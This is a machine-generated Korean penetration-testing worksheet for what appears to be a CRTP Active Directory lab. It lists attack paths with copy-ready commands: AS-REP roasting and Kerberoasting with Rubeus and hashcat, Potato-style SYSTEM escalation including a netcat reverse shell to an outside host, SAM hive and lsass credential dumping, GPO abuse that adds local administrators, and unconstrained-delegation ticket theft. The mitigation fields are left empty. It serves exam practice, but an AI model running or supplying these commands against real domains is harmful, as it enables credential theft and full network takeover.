  - [ ] VPN218user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- _참고(사실): AS-REP roasting VPN218user — 사전 인증 불필요 계정._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] AS-REP Roasting  (prio 22)
- **대상**: VPN219user
- **근거(데이터)**: VPN219user has DONT_REQ_PREAUTH set
- 🛠 **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN219user /nowrap /format:hashcat /outfile:asrep_VPN219user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN219user.txt <wordlist> --force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AS-REP Roasting** 이(가) `VPN219user` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] VPN219user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- _참고(사실): AS-REP roasting VPN219user — 사전 인증 불필요 계정._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] AS-REP Roasting  (prio 22)
- **대상**: VPN220user
- **근거(데이터)**: VPN220user has DONT_REQ_PREAUTH set
- 🛠 **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN220user /nowrap /format:hashcat /outfile:asrep_VPN220user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN220user.txt <wordlist> --force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AS-REP Roasting** 이(가) `VPN220user` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] VPN220user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- _참고(사실): AS-REP roasting VPN220user — 사전 인증 불필요 계정._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [MEDIUM] Kerberoasting  (prio 35)
- **대상**: websvc
- **근거(데이터)**: websvc has SPN set; pwdlastset=1668400933
- 🛠 **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe kerberoast /user:websvc /nowrap /outfile:hash_websvc.txt
    ```
  - _PowerView_:
    ```
    Invoke-Kerberoast -Identity websvc | fl
    ```
  - _AD Module_:
    ```
    Get-ADUser -Identity websvc -Properties ServicePrincipalName | select SamAccountName,ServicePrincipalName
    ```
  - _Crack_:
    ```
    hashcat -m 13100 hash_websvc.txt <wordlist> --force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] SPN이 실제로 설정돼 있는지 (setspn -L 또는 Get-ADUser)
  - [ ] 해시 추출 성공 여부, 크랙된 평문 패스워드
  - [ ] 크랙한 계정이 어떤 그룹/권한을 가지는지 확인
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **Kerberoasting** 이(가) `websvc` 에 대해 실제로 성립함을 입증 (심각도 MEDIUM).
- 📸 **스크린샷**:
  - [ ] websvc SPN 확인 (Get-ADUser/setspn 출력)
  - [ ] Rubeus kerberoast 해시 추출 화면
  - [ ] hashcat 크랙 성공 (평문 노출) 화면
  - [ ] 크랙한 계정으로 인증/권한 확인 화면
- _참고(사실): Kerberoasting websvc. adminCount 계정이면 곧바로 권한 상승 경로일 수 있음._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

## PHASE 4. 로컬 권한상승 후보 — 호스트 레이어

### [CRITICAL] SeImpersonate -> SYSTEM (Potato)  (prio 6)
- **대상**: <current host>
- **근거(데이터)**: token holds SeImpersonatePrivilege (Enabled)
- 🛠 **명령어**:
  - _PrintSpoofer_:
    ```
    PrintSpoofer64.exe -i -c cmd
    ```
    ```
    PrintSpoofer64.exe -c "nc <studvm> 4444 -e cmd"
    ```
  - _GodPotato_:
    ```
    GodPotato-NET4.exe -cmd "cmd /c whoami"
    ```
- ✅ **확인(VERIFY)**:
  - [ ] escalation 후 whoami 가 'nt authority\system' 인지
  - [ ] SYSTEM 쉘에서 mimikatz 로 자격/티켓 덤프 가능한지
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **SeImpersonate -> SYSTEM (Potato)** 이(가) `<current host>` 에 대해 실제로 성립함을 입증 (심각도 CRITICAL).
- 📸 **스크린샷**:
  - [ ] whoami /priv 에 SeImpersonatePrivilege 보이는 화면 (escalation 전)
  - [ ] exploit 실행 + whoami == SYSTEM 화면 (escalation 후)
- _참고(사실): Service-account token can impersonate SYSTEM via named-pipe/RPC trick. Most common service-account escalation. Use port 4444/8888 for any shell._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] SeBackup -> read SAM/SYSTEM & sensitive files  (prio 16)
- **대상**: <current host>
- **근거(데이터)**: token holds SeBackupPrivilege (Enabled)
- 🛠 **명령어**:
  - _reg save_:
    ```
    reg save hklm\sam sam.hiv
    ```
    ```
    reg save hklm\system system.hiv
    ```
    ```
    # offline: secretsdump.py -sam sam.hiv -system system.hiv LOCAL
    ```
- ✅ **확인(VERIFY)**:
  - [ ] escalation 후 whoami 가 'nt authority\system' 인지
  - [ ] SYSTEM 쉘에서 mimikatz 로 자격/티켓 덤프 가능한지
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **SeBackup -> read SAM/SYSTEM & sensitive files** 이(가) `<current host>` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] whoami /priv 에 SeBackupPrivilege 보이는 화면 (escalation 전)
  - [ ] exploit 실행 + whoami == SYSTEM 화면 (escalation 후)
- _참고(사실): Bypasses file DACLs for reads -> dump local hashes offline. Then crack / pass local admin hash._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] SeDebug -> inject into SYSTEM process / dump lsass  (prio 16)
- **대상**: <current host>
- **근거(데이터)**: token holds SeDebugPrivilege (Disabled)
- 🛠 **명령어**:
  - _mimikatz_:
    ```
    Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
    ```
- ✅ **확인(VERIFY)**:
  - [ ] escalation 후 whoami 가 'nt authority\system' 인지
  - [ ] SYSTEM 쉘에서 mimikatz 로 자격/티켓 덤프 가능한지
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **SeDebug -> inject into SYSTEM process / dump lsass** 이(가) `<current host>` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] whoami /priv 에 SeDebugPrivilege 보이는 화면 (escalation 전)
  - [ ] exploit 실행 + whoami == SYSTEM 화면 (escalation 후)
- _참고(사실): Debug any process -> read lsass memory / migrate to SYSTEM. Usually implies near-admin already._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

## PHASE 5. 도메인 권한상승 후보 — ACL / GPO / 위임

### [CRITICAL] ACL abuse: Owns  (prio 10)
- **대상**: DNSADMINS@DOLLARCORP.MONEYCORP.LOCAL
- **근거(데이터)**: Local System has Owns over DNSADMINS@DOLLARCORP.MONEYCORP.LOCAL [HIGH-VALUE target]
- 🛠 **명령어**:
  - _PowerView_:
    ```
    Add-DomainGroupMember -Identity 'DnsAdmins' -Members <you>
    ```
  - _AD Module_:
    ```
    Add-ADGroupMember -Identity 'DnsAdmins' -Members <you>
    ```
- ✅ **확인(VERIFY)**:
  - [ ] Local System 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)
  - [ ] 권한 행사 후 대상에 대한 실질적 접근 획득 확인
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **ACL abuse: Owns** 이(가) `DNSADMINS@DOLLARCORP.MONEYCORP.LOCAL` 에 대해 실제로 성립함을 입증 (심각도 CRITICAL).
- 📸 **스크린샷**:
  - [ ] ACL 확인: Get-DomainObjectAcl -Identity DNSADMINS@DOLLARCORP.MONEYCORP.LOCAL 출력
  - [ ] 권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)
  - [ ] 남용 후 획득한 접근 증명 화면
- _참고(사실): Local System -(Owns)-> DNSADMINS@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [CRITICAL] GPO abuse: GenericAll over GPO  (prio 11)
- **대상**: DCORP-ADMINSRV.DOLLARCORP.MONEYCORP.LOCAL
- **근거(데이터)**: RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL has GenericAll over GPO 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' -> affects 1 computer(s): DCORP-ADMINSRV.DOLLARCORP.MONEYCORP.LOCAL
- 🛠 **명령어**:
  - _Enum_:
    ```
    Get-DomainGPO -Identity 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL'
    ```
    ```
    Get-DomainOU -GPLink <gpo_guid> | select name,distinguishedname
    ```
  - _Abuse (SharpGPOAbuse)_:
    ```
    SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName "APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL"
    ```
    ```
    SharpGPOAbuse.exe --AddComputerTask --TaskName upd --Author <dom\you> --Command cmd.exe --Arguments "/c net localgroup administrators <you> /add" --GPOName "APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL"
    ```
  - _PowerView_:
    ```
    New-GPOImmediateTask -TaskName x -GPODisplayName 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' -CommandArguments '<cmd>' -Force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지
  - [ ] GPO 수정 후 영향 컴퓨터의 gpupdate 시점에 실행되는지
  - [ ] 영향 컴퓨터가 5대 타깃에 포함되는지
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **GPO abuse: GenericAll over GPO** 이(가) `DCORP-ADMINSRV.DOLLARCORP.MONEYCORP.LOCAL` 에 대해 실제로 성립함을 입증 (심각도 CRITICAL).
- 📸 **스크린샷**:
  - [ ] GPO 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' ACL 확인 (Get-DomainGPO / Get-DomainObjectAcl)
  - [ ] GPO 수정 / task 추가 화면
  - [ ] 영향 호스트에서 권한 획득 화면
- _참고(사실): RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL -(GenericAll)-> GPO 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' -> 링크된 OU의 컴퓨터에 코드 실행 (GPO Abuse, LO6)._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [CRITICAL] GPO abuse: GenericWrite over GPO  (prio 11)
- **대상**: DCORP-ADMINSRV.DOLLARCORP.MONEYCORP.LOCAL
- **근거(데이터)**: RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL has GenericWrite over GPO 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' -> affects 1 computer(s): DCORP-ADMINSRV.DOLLARCORP.MONEYCORP.LOCAL
- 🛠 **명령어**:
  - _Enum_:
    ```
    Get-DomainGPO -Identity 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL'
    ```
    ```
    Get-DomainOU -GPLink <gpo_guid> | select name,distinguishedname
    ```
  - _Abuse (SharpGPOAbuse)_:
    ```
    SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName "APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL"
    ```
    ```
    SharpGPOAbuse.exe --AddComputerTask --TaskName upd --Author <dom\you> --Command cmd.exe --Arguments "/c net localgroup administrators <you> /add" --GPOName "APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL"
    ```
  - _PowerView_:
    ```
    New-GPOImmediateTask -TaskName x -GPODisplayName 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' -CommandArguments '<cmd>' -Force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지
  - [ ] GPO 수정 후 영향 컴퓨터의 gpupdate 시점에 실행되는지
  - [ ] 영향 컴퓨터가 5대 타깃에 포함되는지
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **GPO abuse: GenericWrite over GPO** 이(가) `DCORP-ADMINSRV.DOLLARCORP.MONEYCORP.LOCAL` 에 대해 실제로 성립함을 입증 (심각도 CRITICAL).
- 📸 **스크린샷**:
  - [ ] GPO 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' ACL 확인 (Get-DomainGPO / Get-DomainObjectAcl)
  - [ ] GPO 수정 / task 추가 화면
  - [ ] 영향 호스트에서 권한 획득 화면
- _참고(사실): RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL -(GenericWrite)-> GPO 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' -> 링크된 OU의 컴퓨터에 코드 실행 (GPO Abuse, LO6)._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [CRITICAL] GPO abuse: GenericWrite over GPO  (prio 11)
- **대상**: DCORP-CI.DOLLARCORP.MONEYCORP.LOCAL
- **근거(데이터)**: DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL has GenericWrite over GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -> affects 1 computer(s): DCORP-CI.DOLLARCORP.MONEYCORP.LOCAL
- 🛠 **명령어**:
  - _Enum_:
    ```
    Get-DomainGPO -Identity 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL'
    ```
    ```
    Get-DomainOU -GPLink <gpo_guid> | select name,distinguishedname
    ```
  - _Abuse (SharpGPOAbuse)_:
    ```
    SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName "DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL"
    ```
    ```
    SharpGPOAbuse.exe --AddComputerTask --TaskName upd --Author <dom\you> --Command cmd.exe --Arguments "/c net localgroup administrators <you> /add" --GPOName "DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL"
    ```
  - _PowerView_:
    ```
    New-GPOImmediateTask -TaskName x -GPODisplayName 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -CommandArguments '<cmd>' -Force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지
  - [ ] GPO 수정 후 영향 컴퓨터의 gpupdate 시점에 실행되는지
  - [ ] 영향 컴퓨터가 5대 타깃에 포함되는지
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **GPO abuse: GenericWrite over GPO** 이(가) `DCORP-CI.DOLLARCORP.MONEYCORP.LOCAL` 에 대해 실제로 성립함을 입증 (심각도 CRITICAL).
- 📸 **스크린샷**:
  - [ ] GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' ACL 확인 (Get-DomainGPO / Get-DomainObjectAcl)
  - [ ] GPO 수정 / task 추가 화면
  - [ ] 영향 호스트에서 권한 획득 화면
- _참고(사실): DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL -(GenericWrite)-> GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -> 링크된 OU의 컴퓨터에 코드 실행 (GPO Abuse, LO6)._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [CRITICAL] GPO abuse: WriteDacl over GPO  (prio 11)
- **대상**: DCORP-CI.DOLLARCORP.MONEYCORP.LOCAL
- **근거(데이터)**: DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL has WriteDacl over GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -> affects 1 computer(s): DCORP-CI.DOLLARCORP.MONEYCORP.LOCAL
- 🛠 **명령어**:
  - _Enum_:
    ```
    Get-DomainGPO -Identity 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL'
    ```
    ```
    Get-DomainOU -GPLink <gpo_guid> | select name,distinguishedname
    ```
  - _Abuse (SharpGPOAbuse)_:
    ```
    SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName "DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL"
    ```
    ```
    SharpGPOAbuse.exe --AddComputerTask --TaskName upd --Author <dom\you> --Command cmd.exe --Arguments "/c net localgroup administrators <you> /add" --GPOName "DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL"
    ```
  - _PowerView_:
    ```
    New-GPOImmediateTask -TaskName x -GPODisplayName 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -CommandArguments '<cmd>' -Force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지
  - [ ] GPO 수정 후 영향 컴퓨터의 gpupdate 시점에 실행되는지
  - [ ] 영향 컴퓨터가 5대 타깃에 포함되는지
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **GPO abuse: WriteDacl over GPO** 이(가) `DCORP-CI.DOLLARCORP.MONEYCORP.LOCAL` 에 대해 실제로 성립함을 입증 (심각도 CRITICAL).
- 📸 **스크린샷**:
  - [ ] GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' ACL 확인 (Get-DomainGPO / Get-DomainObjectAcl)
  - [ ] GPO 수정 / task 추가 화면
  - [ ] 영향 호스트에서 권한 획득 화면
- _참고(사실): DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL -(WriteDacl)-> GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -> 링크된 OU의 컴퓨터에 코드 실행 (GPO Abuse, LO6)._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [CRITICAL] GPO abuse: WriteOwner over GPO  (prio 11)
- **대상**: DCORP-CI.DOLLARCORP.MONEYCORP.LOCAL
- **근거(데이터)**: DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL has WriteOwner over GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -> affects 1 computer(s): DCORP-CI.DOLLARCORP.MONEYCORP.LOCAL
- 🛠 **명령어**:
  - _Enum_:
    ```
    Get-DomainGPO -Identity 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL'
    ```
    ```
    Get-DomainOU -GPLink <gpo_guid> | select name,distinguishedname
    ```
  - _Abuse (SharpGPOAbuse)_:
    ```
    SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName "DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL"
    ```
    ```
    SharpGPOAbuse.exe --AddComputerTask --TaskName upd --Author <dom\you> --Command cmd.exe --Arguments "/c net localgroup administrators <you> /add" --GPOName "DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL"
    ```
  - _PowerView_:
    ```
    New-GPOImmediateTask -TaskName x -GPODisplayName 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -CommandArguments '<cmd>' -Force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지
  - [ ] GPO 수정 후 영향 컴퓨터의 gpupdate 시점에 실행되는지
  - [ ] 영향 컴퓨터가 5대 타깃에 포함되는지
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **GPO abuse: WriteOwner over GPO** 이(가) `DCORP-CI.DOLLARCORP.MONEYCORP.LOCAL` 에 대해 실제로 성립함을 입증 (심각도 CRITICAL).
- 📸 **스크린샷**:
  - [ ] GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' ACL 확인 (Get-DomainGPO / Get-DomainObjectAcl)
  - [ ] GPO 수정 / task 추가 화면
  - [ ] 영향 호스트에서 권한 획득 화면
- _참고(사실): DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL -(WriteOwner)-> GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -> 링크된 OU의 컴퓨터에 코드 실행 (GPO Abuse, LO6)._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [CRITICAL] Unconstrained Delegation abuse  (prio 15)
- **대상**: DCORP-APPSRV$
- **근거(데이터)**: DCORP-APPSRV$ (computer) TRUSTED_FOR_DELEGATION
- 🛠 **명령어**:
  - _Enum (PowerView)_:
    ```
    Get-DomainComputer -Unconstrained | select samaccountname
    ```
    ```
    Get-DomainUser -TrustedToAuth | select samaccountname
    ```
  - _Rubeus monitor_:
    ```
    Rubeus.exe monitor /interval:5 /nowrap
    ```
  - _Coerce (auth)_:
    ```
    # PetitPotam / SpoolSample 로 DC 인증 강제 → TGT 캡처
    ```
    ```
    Rubeus.exe tgtdeleg
    ```
  - _PTT_:
    ```
    Rubeus.exe ptt /ticket:<base64_TGT>
    ```
- ✅ **확인(VERIFY)**:
  - [ ] 해당 호스트에 로컬 관리자 권한이 있는지 (티켓 모니터링 전제)
  - [ ] 캡처된 TGT의 주체가 특권 계정/DC 컴퓨터 계정인지
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **Unconstrained Delegation abuse** 이(가) `DCORP-APPSRV$` 에 대해 실제로 성립함을 입증 (심각도 CRITICAL).
- 📸 **스크린샷**:
  - [ ] DCORP-APPSRV$ Unconstrained delegation 속성 확인
  - [ ] Rubeus monitor 로 캡처된 TGT 화면
  - [ ] PTT 후 특권 접근 확인 (예: DCSync 또는 DC 접근)
- _참고(사실): 비-DC 호스트의 무제약 위임은 치명적. DC 인증 강제 후 TGT 탈취 경로._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] ACL abuse: GenericWrite  (prio 25)
- **대상**: APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL
- **근거(데이터)**: RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL has GenericWrite over APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL
- 🛠 **명령어**:
  - _PowerView_:
    ```
    Get-DomainObjectAcl -Identity APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL -ResolveGUIDs
    ```
- ✅ **확인(VERIFY)**:
  - [ ] RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)
  - [ ] 권한 행사 후 대상에 대한 실질적 접근 획득 확인
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **ACL abuse: GenericWrite** 이(가) `APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] ACL 확인: Get-DomainObjectAcl -Identity APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL 출력
  - [ ] 권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)
  - [ ] 남용 후 획득한 접근 증명 화면
- _참고(사실): RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL -(GenericWrite)-> APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] ACL abuse: GenericWrite  (prio 25)
- **대상**: DCORP-MGMT.DOLLARCORP.MONEYCORP.LOCAL
- **근거(데이터)**: CIADMIN@DOLLARCORP.MONEYCORP.LOCAL has GenericWrite over DCORP-MGMT.DOLLARCORP.MONEYCORP.LOCAL
- 🛠 **명령어**:
  - _PowerView_:
    ```
    Get-DomainObjectAcl -Identity DCORP-MGMT$ -ResolveGUIDs
    ```
- ✅ **확인(VERIFY)**:
  - [ ] CIADMIN@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)
  - [ ] 권한 행사 후 대상에 대한 실질적 접근 획득 확인
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **ACL abuse: GenericWrite** 이(가) `DCORP-MGMT.DOLLARCORP.MONEYCORP.LOCAL` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] ACL 확인: Get-DomainObjectAcl -Identity DCORP-MGMT.DOLLARCORP.MONEYCORP.LOCAL 출력
  - [ ] 권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)
  - [ ] 남용 후 획득한 접근 증명 화면
- _참고(사실): CIADMIN@DOLLARCORP.MONEYCORP.LOCAL -(GenericWrite)-> DCORP-MGMT.DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] ACL abuse: GenericWrite  (prio 25)
- **대상**: DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL
- **근거(데이터)**: DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL has GenericWrite over DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL
- 🛠 **명령어**:
  - _PowerView_:
    ```
    Get-DomainObjectAcl -Identity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL -ResolveGUIDs
    ```
- ✅ **확인(VERIFY)**:
  - [ ] DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)
  - [ ] 권한 행사 후 대상에 대한 실질적 접근 획득 확인
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **ACL abuse: GenericWrite** 이(가) `DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] ACL 확인: Get-DomainObjectAcl -Identity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL 출력
  - [ ] 권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)
  - [ ] 남용 후 획득한 접근 증명 화면
- _참고(사실): DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL -(GenericWrite)-> DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] ACL abuse: Owns  (prio 25)
- **대상**: DNSUPDATEPROXY@DOLLARCORP.MONEYCORP.LOCAL
- **근거(데이터)**: Local System has Owns over DNSUPDATEPROXY@DOLLARCORP.MONEYCORP.LOCAL
- 🛠 **명령어**:
  - _PowerView_:
    ```
    Add-DomainGroupMember -Identity 'DnsUpdateProxy' -Members <you>
    ```
  - _AD Module_:
    ```
    Add-ADGroupMember -Identity 'DnsUpdateProxy' -Members <you>
    ```
- ✅ **확인(VERIFY)**:
  - [ ] Local System 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)
  - [ ] 권한 행사 후 대상에 대한 실질적 접근 획득 확인
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **ACL abuse: Owns** 이(가) `DNSUPDATEPROXY@DOLLARCORP.MONEYCORP.LOCAL` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] ACL 확인: Get-DomainObjectAcl -Identity DNSUPDATEPROXY@DOLLARCORP.MONEYCORP.LOCAL 출력
  - [ ] 권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)
  - [ ] 남용 후 획득한 접근 증명 화면
- _참고(사실): Local System -(Owns)-> DNSUPDATEPROXY@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
